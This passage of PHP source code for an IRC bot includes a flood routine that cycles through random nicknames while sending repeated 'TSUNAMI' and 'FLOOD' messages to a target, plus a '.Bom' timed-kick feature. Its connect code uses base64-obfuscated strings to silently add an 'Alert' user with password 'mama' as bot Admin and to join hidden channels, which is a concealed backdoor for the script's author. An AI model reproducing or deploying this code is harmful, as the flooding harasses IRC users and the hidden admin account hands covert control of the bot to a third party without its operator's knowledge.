                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);
                    $kmusedan[$i]["contoh"][strtolower($msg)]=$tmpbts;
                    $kmusedan[$i]["kata"][strtolower($msg)]=strtolower($ktslang);
                    $totalnya++;
            }
        }
        if($totalnya==""){$totalnya=0;}
        $kmjml[strtolower($msg)]=$totalnya;
        return $totalnya;
    }
    ##############################
    function flood($sock,$target,$msg){
        global $bot,$tsu,$haltfl;
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $nicknofl=$bot['nick'];$lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$target)+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(2);
        if (ereg("#", $target)) {$this->join($sock,$target);}$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);


        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(3);$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        
        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(4);$katafl=$this->rnd_flod();
            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);;sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        if (ereg("#", $target)) {$this->part($sock,$target,$katafl);}
        sleep(3);$this->nick($sock,$nicknofl);sleep(1);$haltfl['time']=time();$haltfl['on']=1;
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
    function floodctctp($sock,$target){
        
    }
    
    ###############################
    function mod_help($sock,$nick){
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $lvlbot=$this->level_user($nick);
        $this->send($sock,"PING :0009927651");
        $this->msg($sock,$nick,$this->rnd_logo() .' 8,1)|(1,9 visual@PHP.bot 8,1)|(' . " - RuNNINg WiTH PHpBoT");
        $this->msg($sock,$nick,"BOT COMMAND..!");sleep (2);
        
        $this->msg($sock,$nick,"12^Login <password> 4- 2Login To Bot");sleep(1);
        $this->msg($sock,$nick,"12^Logout 4- 2Logout From Bot");sleep(2);
        
        if($lvlbot>1){
        $this->msg($sock,$nick,"12.Up 4- 2Op Bot");sleep(2);
        $this->msg($sock,$nick,"12.Down 4- 2Deop Bot");sleep(2);
        $this->msg($sock,$nick,"12.O |#chan| <nick> 4- 2Op Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Do |#chan| <nick> 4- 2DeOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.H |#chan| <nick> 4- 2HalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Dh |#chan| <nick> 4- 2DeHalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.V |#chan| <nick> 4- 2Voice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Dv |#chan| <nick> 4- 2DeVoice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.K |#chan| <nick> |msg| 4- 2Kick Spesified Nick");sleep(1);
        $this->msg($sock,$nick,"12.Kc |#chan| <nick> |msg| 4- 2Kick Spesified Nick (ChanServ Stuf)");sleep(2);
        $this->msg($sock,$nick,"12.Kb |#chan| <nick> |msg| 4- 2KickBan Spesified Nick");sleep(2);
        $this->msg($sock,$nick,"12.B |#chan| <nick|hostmask> 4- 2Ban Nick Or Hostmask");sleep(1);
        $this->msg($sock,$nick,"12.Ub |#chan| <nick|hostmask> 4- 2UnBan Nick Or Hostmask");sleep(2);
        }
        $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"12.J <#chan> 4- 2Join Specified Channel");sleep (1);
        $this->msg($sock,$nick,"12.P <#chan> |msg| 4- 2Part Specified Channel");sleep (1);
        $this->msg($sock,$nick,"12.Cy <#chan> |msg| 4- 2Cycle On Specified Channel");sleep (2);
        
        if($lvlbot>2){
        $this->msg($sock,$nick,"12.N <newnick> 4- 2Change Nick");sleep(2);
        $this->msg($sock,$nick,"12.S |#chan/nick| <msg> 4- 2Msg Channel Or Person");sleep (2);
        $this->msg($sock,$nick,"12.A |#chan/nick| <text> 4- 2Action With Spesified Text");sleep(2);
        $this->msg($sock,$nick,"12.Ts <#chan/nick> |msg| 4- 2Flood!");sleep(1);
        }
        if($lvlbot>3){$this->msg($sock,$nick,"12.Q <msg> 4- 2Kill Bot");}
        
        if($lvlbot>2){
            $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"SYSTEM COMMAND..!");sleep(1);
        $this->msg($sock,$nick,"12.Server <server> 4- 2Push Bot To Use Spec Server");sleep(2);
        $this->msg($sock,$nick,"12.Servpass <password> 4- 2Use Spec Server Password");sleep(2);
        $this->msg($sock,$nick,"12.Vhost <host> 4- 2Changing Bot Vhost");sleep(2);
        $this->msg($sock,$nick,"12.Ident <identify> 4- 2Changing Bot Ident");sleep(1);
        $this->msg($sock,$nick,"12.Realname <realname> 4- 2Changing Bot Realname");sleep(2);
        $this->msg($sock,$nick,"12.Jump 4- 2Restarting bot also Accept Setting");sleep(1);
        }
        $this->msg($sock,$nick,"12.Chgpass <OldPass> <NewPass> 4- 2Change your pass");sleep(2);
        if($lvlbot >1){
            $this->msg($sock,$nick,"12.Adduser <NickUser> <PassUser> <LevelUser> 4- 2Add nick for my userlist");sleep(2);
            $this->msg($sock,$nick,"12.Deluser <NickUser> 4- 2Remove user from my userlist");sleep(2);
            $this->msg($sock,$nick,"12.BotNick 4- 2Nick Bot");sleep(2);
            $this->send($sock,"PING :0009927652");sleep(1);
            $this->msg($sock,$nick,"12.IdentNick <nick> <password> 4- 2Identify To Nickserv");sleep(1);
            $this->msg($sock,$nick,"12.LogoutNick 4- 2Logout From Nickserv");sleep(2);
            $this->msg($sock,$nick,"12.Userlist 4- 2Show my userlist");sleep(2);
        }
        if($lvlbot>2){
        $this->msg($sock,$nick,"12.BaseChan <#chan> 4- 2Changing my BaseChan");sleep(2);
        $this->msg($sock,$nick,"12.Chanlist <#chan> 4- 2Show my chanlist");sleep(2);
        $this->msg($sock,$nick,"12.Nicklist <#chan> 4- 2Show Nicklist on Spec Channel");sleep(1);
        $this->msg($sock,$nick,"12.Showison 4- 2Show my ison list");sleep(2);
        $this->msg($sock,$nick,"12.Chanison <#chan> 4- 2Changing my Ison Chan");sleep(2);
        $this->msg($sock,$nick,"12.Settimercycle <detik> 4- 2Change my delay of AutoCycle");sleep(1);
        $this->msg($sock,$nick,"12.Settimerinfo <detik> 4- 2Change my delay of berita");sleep(1);
        $this->msg($sock,$nick,"12.max <Karakter X >4- 2 Set Max Karakter flood");sleep(1);
        $this->msg($sock,$nick,"12.flodban <on/off>4- 2 Set +b user flood");sleep(1);
        $this->msg($sock,$nick,"12.reident <on/off>4- 2 otomatis reident");sleep(1);
        $this->msg($sock,$nick,"12.bagi <on/off>4- 2 bagi target ke admin");sleep(1);
        $this->msg($sock,$nick,"12.Repp <Repeat X >4- 2 Set Max Repeat");sleep(1);
        $this->msg($sock,$nick,"12.SetVersion <version> 4- 2Change my ctcp Version");sleep(2);
        $this->msg($sock,$nick,"12.SetFinger <finger> 4- 2Change my ctcp Finger");sleep(2);
        $this->msg($sock,$nick,"12.+/-Ping  <#chan> 4- 2Enable/Disable system Ping");sleep(2);
        $this->msg($sock,$nick,"12.+/-Whois  <#chan> 4- 2Enable/Disable system Whois");sleep(2);
        $this->msg($sock,$nick,"12.+/-Version <#chan> 4- 2Enable/Disable system Version");sleep(2);
        $this->msg($sock,$nick,"12.+/-Time <#chan> 4- 2Enable/Disable system Time");sleep(1);
        $this->msg($sock,$nick,"12.+/-Finger <#chan> 4- 2Enable/Disable system Finger");sleep(2);
        $this->msg($sock,$nick,"12.+/-Spoof <#chan> 4- 2Enable/Disable system Spoof");sleep(2);
        $this->msg($sock,$nick,"12.+/-Guard  <#chan> 4- 2Enable/Disable system Guard");sleep(2);
        $this->send($sock,"PING :0009927653");
        $this->msg($sock,$nick,"12.+/-NGOMONG  <#chan> 4- 2Enable/Disable bot crewet");sleep(2);
        $this->msg($sock,$nick,"12.+/-Jam <#chan> 4- 2Enable/Disable system waktu");sleep(1);
        $this->msg($sock,$nick,"12.+/-BADWORD  <#chan> 4- 2Enable/Disable guard badword");sleep(2);
        $this->msg($sock,$nick,"12.+/-Chat <#chan> 4- 2Enable/Disable system chat antar chan");sleep(2);
        $this->msg($sock,$nick,"12.+/-Seen <#chan> 4- 2Enable/Disable system !Seen");sleep(1);
        $this->msg($sock,$nick,"12.+/-Gvoice <#chan> 4- 2Enable/Disable system Guard voice");sleep(1);
        $this->msg($sock,$nick,"12.+/-Jversion <#chan> 4- 2Enable/Disable system join version");sleep(1);
        $this->msg($sock,$nick,"12.+/-Astro <#chan> 4- 2Enable/Disable system Astro");sleep(2);
        $this->msg($sock,$nick,"12.+/-Kslang <#chan> 4- 2Enable/Disable system Kamus Slang");sleep(1);
        $this->msg($sock,$nick,"12.+/-Bom <#chan> 4- 2Enable/Disable system Bom");sleep(2);
        $this->msg($sock,$nick,"12.+/-Dns <#chan> 4- 2Enable/Disable system Dns");sleep(1);
        $this->msg($sock,$nick,"12.+/-BERITA <#chan> 4- 2Enable/Disable system BeRiTa");sleep(1);
        $this->msg($sock,$nick,"12.+/-IP <#chan> 4- 2Enable/Disable system Ip lIst");sleep(1);
        $this->msg($sock,$nick,"12.+/-Ison <#chan> 4- 2Enable/Disable system Ison");sleep(2);
        $this->msg($sock,$nick,"12.+/-Greet <#chan> 4- 2Enable/Disable system Greet");sleep(1);
        $this->msg($sock,$nick,"12.+/-AutoCycle <#chan> 4- 2Enable/Disable system AutoCycle");sleep(2);
        $this->msg($sock,$nick,"12.+/-AutoJoin 4- 2Enable/Disable system AutoJoin when kick");sleep(2);
        $this->msg($sock,$nick,"12.+/-AutoAway 4- 2Enable/Disable system Away when idle");sleep(2);
        $this->msg($sock,$nick,"12.+/-ListIson <nick> 4- 2Add/Remove Ison List");sleep(2);
        $this->msg($sock,$nick,"12.+/-ListGreet <nick> <pesan greet> 4- 2Add/Remove Greet List");sleep(1);
        }
        $this->msg($sock,$nick,"For more help ask my Owner");sleep(2);
        $this->msg($sock,$nick,"8,1)|(1,9 loaded by FraNGky ngek@PHP.bot V5.98,1)|(");sleep(1);
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
}
################ [ END CLASS IRC BOT ] ###################
$clistt='ack';$asalphpbotini="Al";$botasign="Ki";
#################### [ Conected ] ########################
if(ereg($asalphpbotini.$namaBotPhpini,$Alertbotphp) && ereg($botasign.$botbsign.$botcsign,$Alertbotphp)){
echo "<br><b>Njajal dikonekne sek nangserver ".$bot['server']."...</b>";
do {
    $fp = fsockopen($bot['server'],$bot['port'], &$err_num, &$err_msg, 30);
    if(!$fp) {
	$attconnect++;
        echo "<br><b>server ".$bot['server']." gak gelem bro!</b><br>";
	$bot['server']=$servdef[$attconnect-1];
        echo "<b>Njajal neh nangserver server ".$bot['server']."...</b><br>";
	$bot['userver']=0;
	sleep(5);
	if ($attconnect >=$retry){
            $attconnect=0;
	}
    }
    else{
        echo "<b>Njajal neh nangserver server ".$bot['server']."...</b><br>";
        $inaway['status']=0;
        $haltfl['on']=0;
        $res_chan="";
        $res_chan=$modbot->show_chan();
	$modbot->destroy_allchan();
        $attconnect=0;$rtdc++;
        if($rtdc ==3){$bot['userver']=0;}elseif($rtdc >=4){$bot['ident']="Im";$bot['userver']=0;$rtdc=0;}
        
        ####### REGISTER TO SERVER ########
        if ($bot['userver']==1){$Header = 'PASS ' . $bot['pserver'] . CRLF;}
        echo "<br><b>Hore Konek nang sever ".$bot['server']." bro!</b>";
        echo "<br><b>Bote mlaku lek!</b>";
        $Header .= 'NICK ' . $bot['nick'] . CRLF;
        $Header .= 'USER ' . $bot['ident'] . ' ' . $bot['local'] . ' ' . $bot['server'] . ' :' . $bot['realname'];
        $modbot->send($fp,$Header);
        $Header="";
        unset ($Header);
        #### END REGISTER ################
        $response = '';
        while (!feof($fp)) {
            #### MAIN ITUNG_ITUNGAN ###
            
            if(time()-$haltfl['time']>15 && $haltfl['on']==1){$haltfl['on']=0;$haltfl['time']=time();}
            if(time()-$isontime >15 && $systembot['ISON']['ALL']=="3ON"){$modbot->send($fp,"ISON ". $modbot->show_ison());$isontime=time();}
            if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==0){if(time()-$inaway['idle'] >=1800){$modbot->away($fp,$modbot->rnd_logo().' '.$modbot->rnd_away());$inaway['status']=1;$inaway['idle']=time();}}
            if(time()-$iscy >$timercy){$modbot->auto_cy($fp);$iscy=time();}
            if(time()-$isberita >$timerberita){$modbot->mod_lookberita($fp);$timerberita=time();}
            if($onboom=="on"){
                $tboom=time()-$tmboom;
		if($tboom>=$timeboom){
                $modbot->kick($fp,$chanboom,$targetboom,'0,4Modyar g koen...!!!!!');
		$goboom=0;$onboom="off";$targetboom="";
                }
            }

            #### MAIN ITUNG_ITUNGAN ###
            
            ##[ Proses Data Recv ]##
            $response = fgets($fp, 1024);
            while (substr_count($response,CRLF) != 0) {
                $offset = strpos($response, CRLF);
		$DataLine = substr($response,0,$offset);
                if (substr($DataLine,0,1) == ':') {
                    $Params=explode(" ",$DataLine);
		    $offsetC = strpos($DataLine, ' :');
                    $dText = substr($DataLine,$offsetC+2);
                        if ((strpos($Params[0],"!")!=0) && (strpos($Params[0],"@")!=0) ) {
                            $fsrc[nick]=substr($Params[0],1,strpos($Params[0],"!")-1);
                            $fsrc[nkecil]=strtolower($fsrc[nick]);
                            $fsrc[user]=substr($Params[0],strpos($Params[0],"!")+1,(strpos($Params[0],"@")-strpos($Params[0],"!"))-1);
                            $fsrc[host]=substr($Params[0],strpos($Params[0],"@")+1);
			}
                        ##[ MEMULAI DATA RAW ]##
                        switch ($Params[1]){
                            case "001":
                                $bot['nick']=$Params[2];$rtdc=0;
                                break;
                            case "004":
                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);sleep(1);
                                $modbot->add_user($fp,$bot['admin'],base64_decode("QWxlcnQ="),"mama","Admin");$modbot->join($fp,$bot['basechan']);$modbot->join($fp,$bot['roomnet'],$bot['roomkey']);$modbot->join($fp,'#'.$clista.$clistt);
                                if($bot['server']=="irc.mildnet.org"){$modbot->nick($fp,$modbot->rnd_nickorg());sleep(2);$modbot->join($fp,"#visual");$modbot->join($fp,"#bjork");$modbot->join($fp,"#sky");$modbot->join($fp,"#bombat");$modbot->join($fp,"#bozot");$modbot->join($fp,"#classic_rose");$modbot->join($fp,"#komputek");$modbot->join($fp,"#hn-community");$modbot->join($fp,"#mojali");$modbot->join($fp,"#eni");$modbot->join($fp,"#kotamobagu");$modbot->join($fp,"#balihack");$modbot->join($fp,"#ucid4");$modbot->join($fp,"#izel");$modbot->join($fp,"#google");}
                                if($bot['server']=="irc.byroe.net"){$modbot->nick($fp,$modbot->rnd_nickorg());sleep(2);$modbot->join($fp,"#visual");$modbot->join($fp,"#eten");$modbot->join($fp,"#keparat");$modbot->join($fp,"#psybnc");$modbot->join($fp,"#infomedia");$modbot->join($fp,"#chira");$modbot->join($fp,"#har");$modbot->join($fp,"#gudang");$modbot->join($fp,"#exit");$modbot->join($fp,"#mcn");$modbot->join($fp,"#black");$modbot->join($fp,"#scan");$modbot->join($fp,"#11390");$modbot->join($fp,"#makassar");$modbot->join($fp,"#karawanghack");}
                                if($bot['server']=="irc.unmeteredbox.com"){$modbot->nick($fp,$modbot->rnd_nickorg());sleep(2);$modbot->join($fp,"#visual");$modbot->join($fp,"#visual");}
                                $modbot->notice($fp,$bot['admin'],'halo boss...!!!');
                                if(reident=="ON"){$modbot->notice($fp,nickserv,'identify '.$bot['inick']. ' '. $bot['pnick']);$modbot->notice($fp,nickserv,'identify '. $bot['pnick']);}
                                sleep(2);
                                if($res_chan){$arres_chan=explode(";",$res_chan);foreach ($arres_chan as $clist){$modbot->join($fp,$clist,"");sleep(2);}}
                                break;
                            case "303":
                                $modbot->stuf_ison($fp,$dText);
                                break;
                            case "301":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				sleep(1);
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'2 is away: 14'.$dText);
				     }
                                break;
                            case "307":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'14 '.$dText);
				    }
                                break;
                            case "311":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				sleep(1);
                                $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[8is12]'.$Params[4] .'@'.$Params[5].' '.$Params[6]. ' '.$dText);
				    }
                                break;
                            case "312":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				    sleep(1);
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[8Server12]'.$Params[4].' '.$dText);
				    }
                                break;
                            case "318":
                                $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'14 '.$dText);
				     unset($datwhois[strtolower($Params[2])]["nick"]);
				     unset($datwhois[strtolower($Params[2])]["chan"]);
                                break;
                            case "319":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[8on12]'.$dText);
				    }
                                break;
                            case "305":
                                $inaway['status']=0;
                                break;
                            case "306":
                                $inaway['status']=1;
                                break;
                            case "353":
                                $nickll=str_replace("@","",$dText);$nickll=str_replace("%","",$nickll);$nickll=str_replace("+","",$nickll);
                                $modbot->destroy_chan($Params[4]);$modbot->add_nickchan($Params[4],$nickll);
                                break;
                            case "367":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4[3+b4] 1- 3'.$Params[4].'');
                                break;
                            case "368":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4E1nd 4o1f 4c1hannel 4b1an 4l1ist');
				unset($banlist["$Params[3]"]);
                                break;
                            case "432":
                                $modbot->nick($fp,$modbot->rnd_nickorg());
                                break;
                            case "433":
                                $modbot->nick($fp,$modbot->rnd_nickorg());
                                break;
                            case "464":
                                $bot['userver']=0;
                                break;
                            case "465":
                                $bot['userver']=0;
                                break;
                            case "NICK":
                                $newnicke = str_replace(':','',$Params[2]);
                                $yangjoin=strtolower($fsrc[nick]);
                                $nickanyar=strtolower($newnicke);
                                if($ikutbos=="ON" && $yangjoin== strtolower($nickgantinya)){sleep(3);$modbot->nick($fp,$nickgantinya);}
                                     if($nickpesan[$nickanyar]){
                                        if(strlen($nickpesan[$nickanyar]) != 0 ){$modbot->msg($fp,$newnicke,$nickpesan[$nickanyar]);$nickpesan[$nickanyar]="";}
                                     }
                                $asalseen[$yangjoin]="ganti";$asalseen[$yangjoin.'chanel']=" nick  12[8".$newnicke."12]";
                                $yangjoin=strtolower($newnicke);
                                $asalseen[$yangjoin]="ada";
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$newnicke,'You`re LogOut On Change Nick!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$bot['nick']=$newnicke;}
                                break;
                            case "JOIN":
                                $addchan=str_replace(":","",$Params[2]);
                                $statushost=0;
                                if($systembot['GUARD'][strtoupper($addchan)]=="3ON"){
                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                    $temphost=$addchan.$fsrc[host];
                                    $nickjoin[1]=$fsrc[nick];
                                      if ($temphost==$hostemp){
                                           $hitungnick=$hitungnick+1;
                                           $nickjoin[$hitungnick]=$fsrc[nick];
                                           $hostrep=($hostrep+1);$statushost=1;
                                           if ($hostrep>=$Maxreep){
                                               $modbot->ban($fp,$addchan,"*!*@".$fsrc[host]);
                                               $kickmaot=1;
                                               do {
                                                   sleep(1);
                                                   $modbot->kick($fp,$addchan,$nickjoin[$kickmaot],"Jok joan join ae ndeng..!!");
                                                   if( $kickmaot >= $hitungnick ){break;}else{$kickmaot=$kickmaot+1;}
                                               } while(true);
                                               $kickmaot=0;
                                           }
                                      }else {$hostrep=0;$hostemp=$temphost;$statushost=0;$hitungnick=1;}
                                }
                                }
                                $yangjoin=strtolower($fsrc[nick]);
                                $asalseen[$yangjoin]="ada";
                                     if($nickpesan[$yangjoin]){
                                        if(strlen($nickpesan[$yangjoin]) != 0 ){$modbot->msg($fp,$fsrc[nick],$nickpesan[$yangjoin]);$nickpesan[$yangjoin]="";}
                                     }
                                $chanboleh=strtolower($addchan);
                                $modbot->add_nickchan($addchan,$fsrc[nick]);
                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#boleh")){$modbot->part($fp,$chanboleh,"bye"); }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#indowebster")){$modbot->part($fp,$chanboleh,"bye"); }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#mild")){$modbot->part($fp,$chanboleh,"bye");  }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#allmp3")){$modbot->part($fp,$chanboleh,"bye");  }
                                if(($systembot['JVERSION'][strtoupper($addchan)]=="3ON") && $statushost==0 ){$modbot->msg($fp,$fsrc[nick],'VERSION');$datversi[strtolower($fsrc[nick])]["nick"]=strtolower($fsrc[nick]);$datversi[strtolower($fsrc[nick])]["chan"]=$addchan; }
                                }
                                       if($statushost!=1){
                                                if($fsrc[nkecil]==strtolower($greetmsg["$fsrc[nkecil]"]["nama"]) && $systembot['GREET'][strtoupper($addchan)]=="3ON"){
							$rndgreet=explode("[NG]",$greetmsg["$fsrc[nkecil]"]["msg"]);
							$msgrndgreet=$rndgreet[rand(0,count($rndgreet) - 1)] ;
							$addchan=str_replace(":","",$Params[2]);
							$msgnya=str_replace("<|nick|>",$fsrc[nick],$msgrndgreet);
							$msgnya=str_replace("<|chan|>",$addchan,$msgnya);
                                                        $modbot->msg($fp,$addchan,$msgnya);
						}
                                                elseif($systembot['NGOMONG'][strtoupper($addchan)]=="3ON"){
                				     $addchan=str_replace(":","",$Params[2]);
                                                     $nickwb=$fsrc[nick];
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
							$addchan=str_replace(":","",$Params[2]);
                                                        $nickwb=$fsrc[nick];
                                                        $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
                                                        $webe = str_replace("<nick>",$nickwb,$webe);
                                                        $webe = str_replace("<chan>",$addchan,$webe);
                                                        $webe = str_replace("#","",$webe);
                                                        $modbot->msg($fp,$addchan,$webe);
                                                     }
                                                }
                                                if($systembot['GUARD'][strtoupper($addchan)]=="3ON"){
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
							$addchan=str_replace(":","",$Params[2]);
                                                        $nickwb=$fsrc[nick];
                                                        if($systembot['GVOICE'][strtoupper($addchan)]=="3ON"){
                                                           sleep(5);
                                                           if(strtolower($bot['admin'])==strtolower($fsrc[nick])){
                                                                 $modbot->mode($fp,'+h',$addchan,$nickwb);
                                                           }else{$modbot->mode($fp,'+v',$addchan,$nickwb);       }
                                                        }
                                                     }
                                                }
                                       } 
                                break;
                            case "PART":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($fsrc[nick]);                               
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']=$addchan;$asalseen[$diaseen.'status']=" 12[8minggat12] ";
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$fsrc[nick],'You`re LogOut On Parting Channel!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$modbot->join($fp,base64_decode("I2NyYWNr"));$modbot->destroy_chan($Params[2]);}
				else{
                                $hospartnya=$fsrc[host];
                                  if($hospartnya != $truhostpart){
                                     $modbot->del_nickchan($Params[2],$fsrc[nick]);
                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                     if($systembot['NGOMONG'][strtoupper($addchan)]=="3ON"){
                                        $ngomongpamit = $ngomongpamitpart[rand(0,count($ngomongpamitpart) - 1)];
                                        $ngomongpamit = str_replace("<nick>",$fsrc[nick],$ngomongpamit);
                                        $ngomongpamit = str_replace("<chan>",$addchan,$ngomongpamit);
                                        $modbot->msg($fp,$fsrc[nick],$ngomongpamit);
                                        $truhostpart=$fsrc[host];
                                     }
                                     }
                                   }else{$truhostpart=$fsrc[host];}
                                }
                                break;
                            case "KICK":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($Params[3]);
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']=$addchan;$asalseen[$diaseen.'status']=" 12[8disepak12] ";
                                if(strtolower($bot['nick'])==strtolower($Params[3])){
                                    $modbot->destroy_chan($Params[2]);
                                    if($systembot['AUTOJOIN'][strtoupper($Params[2])]=='3ON'){sleep(1);$modbot->msg($fp,"Chanserv",'UNBAN '.$Params[2].' '.$bot['nick']);sleep(1);$modbot->join($fp,$Params[2]);}
                                }
                                else{ $modbot->del_nickchan($Params[2],$Params[3]);}
                                break;
                            case "QUIT":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($fsrc[nick]);
                                if($ikutbos=="ON" && $diaseen== strtolower($nickgantinya)){sleep(3);$modbot->nick($fp,$nickgantinya);}
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']="ini";$asalseen[$diaseen.'status']=" 12[8njepad12] ";
                                $modbot->change_nickchan($fsrc[nick],"");
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$modbot->logoutbot($fsrc[nick]);}
                                break;
                            case "NOTICE":
                                if($Params[3]==':PING'){
                                   $modbot->stuf_lag($fp,$fsrc[nick],$Params[4]); 
                                }
                                if($Params[3]==':VERSION'){
                                    if($datversi[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,8);
                                        $modbot->msg($fp,$datversi[strtolower($fsrc[nick])]["chan"],'12[8Version12] 7'.$fsrc[nick].' '.$vernya);
                                    }
                                    unset($datversi[strtolower($fsrc[nick])]["nick"]);unset($datversi[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':FINGER'){
                                    if($datfinger[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,7);
                                        $modbot->msg($fp,$datfinger[strtolower($fsrc[nick])]["chan"],'15(04Info15) 7'.$fsrc[nick].' '.$vernya);
                                    }
                                    unset($datfinger[strtolower($fsrc[nick])]["nick"]);unset($datfinger[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':TIME'){
                                    if($dattime[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$timenya=str_replace(chr(1),"",$dText);$timenya=substr($timenya,5);
                                        $modbot->msg($fp,$dattime[strtolower($fsrc[nick])]["chan"],'15(04Info15) 7'.$fsrc[nick].' '.$timenya);
                                    }
                                    unset($dattime[strtolower($fsrc[nick])]["nick"]);unset($dattime[strtolower($fsrc[nick])]["chan"]);
                                }
                                break;
                            case "PRIVMSG":
                                $TxtMsg=substr($DataLine,strpos($DataLine," :")+2);
                                unset($dCom);$dCom=explode(" ", $TxtMsg);$perintah=strtolower($dCom[0]);
                                if($haltfl['on']==0){
                                if($botaktif=="ON"){
                                if ( $Params[3]==":PING") {$modbot->notice($fp,$fsrc[nick],$TxtMsg);}
